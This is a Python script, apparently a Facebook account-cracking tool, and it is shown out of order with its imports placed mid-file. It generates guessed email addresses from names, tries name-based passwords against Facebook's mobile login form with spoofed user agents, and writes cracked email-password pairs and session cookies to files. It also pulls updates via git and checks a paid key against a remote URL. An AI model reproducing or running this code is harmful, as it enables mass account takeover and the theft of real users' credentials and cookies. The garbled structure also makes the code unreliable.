data={'lsd':lsd_key,'jazoest':jazoest_key,
                                      'm_ts':m_ts_key,'li':li_key,
                                      'try_number':try_number_key,
                                      'unrecognized_tries':unrecognized_tries_key,
                                      'bi_xrwh':bi_xrwh_key,'email':ids,
                                      'pass':pas,'login':"submit"}
                                response_body2=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,allow_redirects=True,headers=head)
                                cookie=str(session.cookies.get_dict())
                                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                open("o.html",'wb').write(response_body2.content)
                                if "c_user" in cookie:
                                        print('\r\r\033[1;32m Cracked ã€‹OK %s | %s'%(ids,pas))
                                        print(" Cookie :" ,coki)
                                        open('ok.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                        linex()
                                        oks.append(ids)
                                elif 'checkpoint' in cookie:
                                        print('\r\033[1;33m Cracked ã€‹CP '+ids+' | '+pas)
                                        open('cp.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                        cps.append(ids)
                                else:
                                        continue
                        loop+=1

                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "|".join(uuid)
  server = requests.get(f'{approve}').text
  

  os.system(f" clear") 
  print(banner)                         
  print(f"""\033[1;37m
 This Tool is Paid Tool

 ===================================""")
  print(f"\033[1;32m [*] KEY : \033[1;37m"+id)
  print(f" \033[1;37m===================================")
  print(f"\033[1;33m [*]Copy Key And Send To Me");time.sleep(0.1)
  print(f" \033[1;37m===================================")
  print("\033[1;35m Checking........")
  print(f" \033[1;37m===================================")
  time.sleep(2)
  import os,requests,time,random,sys,string,subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as bs
os.system("git pull")
loop=0
oks=[]
cps=[]
ugen=[]
OKGREEN = '\033[92m'
WARNING = '\033[93m'
OKBLUE = '\033[94m'
HEADER = '\033[95m'
ENDC = '\033[0m'
CYAN = '\033[96m'
FAIL = '\033[91m'
bold='\033[1m'
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S681
L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
approve = "https://raw.githubusercontent.com/xcoder-ksb/APPROVED/main/api.txt"        
banner = f"""

 {bold}{OKGREEN}â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     
 â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     
 {CYAN}â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     
 â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     
 {FAIL}â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
 â•šâ•â•     â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•â•â•â•â•
 {CYAN}Author   - {HEADER}GUS GUS
 {CYAN}Telegram - {WARNING}https://t.me/gusgus34
 {CYAN}Vesion   - {OKGREEN}Free

"""
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android'
        ver = random.choice(['1','2','3','4','5','6','7','8','9','10','11','12'])
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f'Readmi Note;{ver}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uag=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uag)
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(banner)
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: ZawZaw, Aung, Myo, Lwin\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: Gyi, Lay,  \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as crack:
                        total = str(len(fo))
						clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'htet'
                                first = first_name.lower()
                                last = last_name.lower()
                                passlist = [first+last,first+' '+last,first+'123',first+'12345',first+'123456',first,first+'1234',first+'12',first+last+'123',first+last+'1234',first+last+'12345']
                                crack.submit(rndm,ids,passlist)
                                        
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
def rndm(ids,passlist):
                try:
                        global loop,oks,cps
                        sys.stdout.write('\r\r\033[1;37m [Cracking] - %s \033[1;32mOK-%s \033[1;33mCP-%s\033[1;97m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                        for pas in passlist:
                                session = requests.Session()
                                ug = random.choice(ugen)
                                head ={'authority': 'mbasic.facebook.com',
                                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                       'method':'POST',
                                       'accept-language': 'en-US,en;q=0.9',
                                       'cache-coxntrol': 'max-age=0',
                                       'content-type': 'application/x-www-form-urlencoded',
                                       'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                                       'sec-ch-ua-mobile': '?0',
                                       'sec-ch-ua-platform': '"Linux"',
                                       'sec-fetch-dest': 'document',
                                       'sec-fetch-mode': 'navigate',
                                       'sec-fetch-site': 'same-origin',
                                       'sec-fetch-user': '?1',
                                       'upgrade-insecure-requests': '1',
                                       'user-agent': ug,
                                }
                                with session.get("https://mbasic.facebook.com/") as response_body:
                                        inspect=bs(response_body.text,'html.parser')
                                        lsd_key=inspect.find('input',{'name':'lsd'})['value']
                                        jazoest_key=inspect.find('input',{'name':'jazoest'})['value']
                                        m_ts_key=inspect.find('input',{'name':'m_ts'})['value']
                                        li_key=inspect.find('input',{'name':'li'})['value']
                                        try_number_key=inspect.find('input',{'name':'try_number'})['value']
                                        unrecognized_tries_key=inspect.find('input',{'name':'unrecognized_tries'})['value']
                                        bi_xrwh_key=inspect.find('input',{'name':'bi_xrwh'})['value']